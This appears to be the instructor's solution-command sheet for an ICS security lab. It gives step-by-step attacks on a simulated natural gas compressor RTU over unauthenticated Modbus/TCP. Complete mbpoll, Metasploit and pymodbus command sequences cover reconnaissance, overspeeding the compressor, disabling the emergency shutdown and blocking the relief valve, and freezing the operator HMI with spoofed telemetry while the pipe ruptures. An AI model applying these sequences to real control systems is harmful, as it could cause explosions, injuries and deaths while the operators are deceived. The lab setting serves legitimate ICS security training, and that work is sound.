# Redwater Compressor Station (Scenario 4): Solution Commands

**Facility:** Natural Gas Pipeline Compressor Station
**Protocol:** Modbus/TCP · Port 5023 · Unit/Slave ID 1

> Solution commands for each attack phase.
> Multiple tool options are shown per phase so students practice the same
> workflow a real assessor uses, not just one library.

---

## Real-world tooling & context

A gas pipeline RTU exposed over Modbus/TCP with no authentication is a
realistic field configuration, repeatedly flagged in DHS/CISA ICS advisories.
The attacker workflow is the same discover, enumerate, weaponize loop as any
Modbus target, so the same standard tools apply.

| Step | Tools shown here |
|------|------------------|
| Port discovery | `nmap` (find open ports; its service name is only a guess) |
| Protocol fingerprint | `mbpoll` register read, device-ID query |
| Read / enumerate | `mbpoll`, Metasploit `modbusclient`, pymodbus |
| Write / manipulate | `mbpoll`, Metasploit `modbusclient`, pymodbus |
| Eavesdrop | Wireshark |

**This RTU uses all four Modbus tables** (unlike the HydraGuard dam, which
maps everything into holding registers and coils):

| Table | mbpoll `-t` | Access | Holds |
|-------|-------------|--------|-------|
| Input Registers   | `-t 3` | read-only | analog telemetry (pressure, RPM, temp, vibration, flow, pipe stress) |
| Discrete Inputs   | `-t 1` | read-only | status flags (valve positions, ESD/PRV, alarms, rupture) |
| Coils             | `-t 0` | read/write | control commands (ATTACKABLE) |
| Holding Registers | `-t 4` | read/write | setpoints (ATTACKABLE) |

**Addressing note.** Point numbers are **0-based** in this lab (coil 0 =
esd_armed, holding register 0 = rpm_setpoint). `mbpoll` defaults to 1-based
references, so every example below uses the `-0` flag to make the reference
number match the point number directly. Metasploit `DATA_ADDRESS` and pymodbus
are already 0-based.

**Analog telemetry is scaled to integers** so it fits a 16-bit register:
pressure and temperature and flow are x10, vibration and pipe stress are x100,
RPM is x1. So a discharge pressure of 1420.0 psi reads as `14200`, vibration of
2.00 mils reads as `200`, and the RPM setpoint is written as a plain number
(`15000` = 15000 RPM).

**Point map**

| Point | Table | Access | Meaning |
|-------|-------|--------|---------|
| IR 0  | Input Register | R | suction_pressure (psi x10) |
| IR 1  | Input Register | R | discharge_pressure (psi x10) |
| IR 2  | Input Register | R | compressor_rpm (RPM x1) |
| IR 3  | Input Register | R | discharge_temp (F x10) |
| IR 4  | Input Register | R | vibration (mils x100) |
| IR 5  | Input Register | R | flow_rate (MMSCFD x10) |
| IR 6  | Input Register | R | pipe_stress (% x100) |
| DI 0-2 | Discrete Input | R | suction / discharge / blowdown valve position |
| DI 3  | Discrete Input | R | esd_tripped |
| DI 4  | Discrete Input | R | prv_relieving |
| DI 5  | Discrete Input | R | ruptured |
| DI 6-9 | Discrete Input | R | high pressure / vibration / overspeed / temp alarms |
| Coil 0 | Coil | W | **esd_armed** (write 0 = bypass SIS) |
| Coil 1 | Coil | W | **prv_block_valve_closed** (write 1 = block relief) |
| Coil 2 | Coil | W | suction_valve_open command |
| Coil 3 | Coil | W | discharge_valve_open command |
| Coil 4 | Coil | W | blowdown_valve_open command |
| Coil 5 | Coil | W | **telemetry_spoofed** (write 1 = freeze HMI) |
| HR 0  | Holding Register | W | **rpm_setpoint** (RPM) |

---

## Phase 1: RTU Reconnaissance

**Objective:** Discover the Modbus RTU and read every table to map the compressor process and its writable control points.

### Step 1: Find open ports (nmap)

```bash
nmap -sT -p 1-10000 localhost
# Reveals 5020-5023 open (this host runs several ICS services).
# The SERVICE column is only a static guess for the port number; it does NOT
# confirm the protocol. Confirm by speaking Modbus in Step 2.
```

> **Why nmap cannot fingerprint it here.** This lab runs Modbus on **5023, not
> the standard 502**, so `nmap -sV` cannot fingerprint the device and the
> `modbus-discover` NSE script will not even run (its port rule is hard-wired to
> port 502). ICS on non-standard ports routinely defeats nmap's guesses. The
> reliable way to identify the service is to speak the protocol and see if it
> answers (below).

### Step 2: Confirm Modbus and read all four tables (mbpoll)

```bash
# Input registers 0-6 (analog telemetry, read-only). -t 3, -0 = 0-based, -1 = poll once
mbpoll -0 -m tcp -a 1 -r 0 -c 7 -t 3 -1 -p 5023 localhost

# Discrete inputs 0-9 (status flags, read-only)
mbpoll -0 -m tcp -a 1 -r 0 -c 10 -t 1 -1 -p 5023 localhost

# Coils 0-5 (control commands, writable = attack targets)
mbpoll -0 -m tcp -a 1 -r 0 -c 6 -t 0 -1 -p 5023 localhost

# Holding register 0 (rpm_setpoint, writable)
mbpoll -0 -m tcp -a 1 -r 0 -c 1 -t 4 -1 -p 5023 localhost

# Continuous poll (drop -1) to watch telemetry update live, like an HMI:
mbpoll -0 -m tcp -a 1 -r 0 -c 7 -t 3 -p 5023 localhost
# Remember telemetry is scaled: 14200 = 1420.0 psi, 200 = 2.00 mils, etc.
```

### Step 3: Identify the device (Read Device ID)

```bash
python3 -c "
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('localhost', port=5023); c.connect()
info = c.read_device_information().information
labels = {0:'Vendor', 1:'Product code', 2:'Revision'}
for k in sorted(info):
    print(f'{labels.get(k,k):12}: {info[k].decode()}')
c.close()"
# Expected:
#   Vendor      : Emerson
#   Product code: ROC800L
#   Revision    : 3.8
# => an Emerson ROC800L remote operations controller, the compressor RTU.
```

### More ways to read (Metasploit)

```bash
msfconsole -q
use auxiliary/scanner/scada/modbusdetect
set RHOSTS 127.0.0.1
set RPORT 5023
run

use auxiliary/scanner/scada/modbusclient
set RHOSTS 127.0.0.1
set RPORT 5023
set UNIT_NUMBER 1

# Analog telemetry (input registers 0-6)
set ACTION READ_INPUT_REGISTERS
set DATA_ADDRESS 0
set NUMBER 7
run

# Control coils 0-5
set ACTION READ_COILS
set DATA_ADDRESS 0
set NUMBER 6
run
```

---

## Phase 2: Setpoint Manipulation

**Objective:** Write the compressor RPM setpoint past safe limits and watch the plant's own safety system respond. With the ESD armed (default), a single write just triggers a safe shutdown, which is the lesson of defense in depth.

```bash
# Overspeed the compressor: holding register 0 = 12500 RPM (nominal is 9500).
mbpoll -0 -m tcp -a 1 -r 0 -t 4 -p 5023 localhost 12500

# Watch RPM climb, then the ESD trip it back to 0 and open the blowdown valve.
# IR 2 = compressor_rpm, IR 1 = discharge_pressure, DI 3 = esd_tripped
mbpoll -0 -m tcp -a 1 -r 0 -c 7 -t 3 -p 5023 localhost   # telemetry, live
mbpoll -0 -m tcp -a 1 -r 3 -c 1 -t 1 -p 5023 localhost   # esd_tripped, live
```

### With Metasploit

```bash
use auxiliary/scanner/scada/modbusclient
set RHOSTS 127.0.0.1
set RPORT 5023
set UNIT_NUMBER 1
set ACTION WRITE_REGISTER
set DATA_ADDRESS 0
set DATA 12500
run
```

**Result:** compressor_rpm climbs, the armed ESD trips (DI 3 = 1), the blowdown
valve opens, and RPM falls to 0. Single-point sabotage against an armed SIS just
causes a safe shutdown. To do real damage you must first defeat the safety
layers (Phase 3).

---

## Phase 3: Safety System Bypass (TRISIS Pattern)

**Objective:** Disable BOTH safety layers, the electronic ESD (Layer 1) and the mechanical PRV isolation (Layer 2), then re-run the overspeed so nothing stops the pressure from climbing to rupture.

```bash
# Step 1: Bypass the ESD/SIS. Coil 0 = 0 removes the electronic protective trip.
mbpoll -0 -m tcp -a 1 -r 0 -t 0 -p 5023 localhost 0

# Step 2: Block the mechanical relief valve. Coil 1 = 1 closes the PRV isolation
# valve, removing the last fail-safe (the BP Texas City 2005 failure mode).
mbpoll -0 -m tcp -a 1 -r 1 -t 0 -p 5023 localhost 1

# Step 3: Close the blowdown valve if Phase 2's trip left it open. Coil 4 = 0.
mbpoll -0 -m tcp -a 1 -r 4 -t 0 -p 5023 localhost 0

# Step 4: Overspeed again with both layers down. Holding register 0 = 15000 RPM.
mbpoll -0 -m tcp -a 1 -r 0 -t 4 -p 5023 localhost 15000

# Watch pipe stress (IR 6) climb unchecked toward the 100% rupture threshold.
mbpoll -0 -m tcp -a 1 -r 6 -c 1 -t 3 -p 5023 localhost
```

### With Metasploit

```bash
use auxiliary/scanner/scada/modbusclient
set RHOSTS 127.0.0.1
set RPORT 5023
set UNIT_NUMBER 1

# Bypass ESD (coil 0 = 0)
set ACTION WRITE_COIL
set DATA_ADDRESS 0
set DATA 0
run

# Block PRV isolation (coil 1 = 1)
set DATA_ADDRESS 1
set DATA 1
run

# Close blowdown (coil 4 = 0)
set DATA_ADDRESS 4
set DATA 0
run

# Overspeed (holding register 0 = 15000)
set ACTION WRITE_REGISTER
set DATA_ADDRESS 0
set DATA 15000
run
```

**Result:** esd_armed=false, prv_block_valve_closed=true, and pipe_stress climbs
past 50% with nothing left to stop it, ending in a compressor_overspeed rupture
(DI 5 = 1).

---

## Phase 4: Telemetry Spoofing to Rupture (PIPEDREAM Pattern)

**Objective:** Activate the undocumented telemetry-spoofing coil so the operator HMI freezes at nominal, then finish the attack blind. The Control Room shows a calm, healthy station while the pipe ruptures underneath, exactly the Stuxnet-style deception PIPEDREAM/INCONTROLLER was built for.

```bash
# Step 1: Activate telemetry spoofing. Coil 5 = 1 freezes every value the HMI
# and any polling master receive at a fabricated nominal snapshot.
mbpoll -0 -m tcp -a 1 -r 5 -t 0 -p 5023 localhost 1
# Switch to the Control Room tab: it now shows nominal pressure/RPM/vibration
# no matter what happens next. The Lab Monitor still shows ground truth.

# Step 2: Finish the overspeed blind (assumes ESD + PRV already defeated in
# Phase 3). Holding register 0 = 16000 RPM.
mbpoll -0 -m tcp -a 1 -r 0 -t 4 -p 5023 localhost 16000

# Step 3: Watch ground truth diverge from the frozen HMI. IR 6 = pipe_stress,
# DI 5 = ruptured. The operator's screen never changes.
mbpoll -0 -m tcp -a 1 -r 6 -c 1 -t 3 -p 5023 localhost
mbpoll -0 -m tcp -a 1 -r 5 -c 1 -t 1 -p 5023 localhost
```

### With Metasploit

```bash
use auxiliary/scanner/scada/modbusclient
set RHOSTS 127.0.0.1
set RPORT 5023
set UNIT_NUMBER 1

# Activate telemetry spoofing (coil 5 = 1)
set ACTION WRITE_COIL
set DATA_ADDRESS 5
set DATA 1
run

# Finish the overspeed blind (holding register 0 = 16000)
set ACTION WRITE_REGISTER
set DATA_ADDRESS 0
set DATA 16000
run
```

**Result:** actual pipeline state ruptures (DI 5 = 1) while the operator HMI
still reads nominal. The Lab Monitor's DECEPTION STATUS panel shows the
divergence between ground truth and what the operator sees. This is the full
PIPEDREAM pattern: defeat the safety layers, then blind the operator, then
destroy the asset.

---

## Passive eavesdropping (optional, any phase)

**Objective:** Confirm all traffic is cleartext with no authentication.

1. Capture on interface **Loopback: lo0** (127.0.0.1 traffic rides lo0).
2. Capture filter: `tcp port 5023`.
3. Wireshark auto-dissects Modbus only on port 502, so right-click a port-5023
   packet, choose **Decode As...**, set the port to **MODBUS/TCP**, then apply
   the display filter `modbus`.

> **Realism note:** on a real switched network you could not passively see this
> traffic from an arbitrary host; you would need a SPAN/mirror port, a tap, or a
> MITM position. Loopback hands it to you here purely to study the cleartext
> weakness.
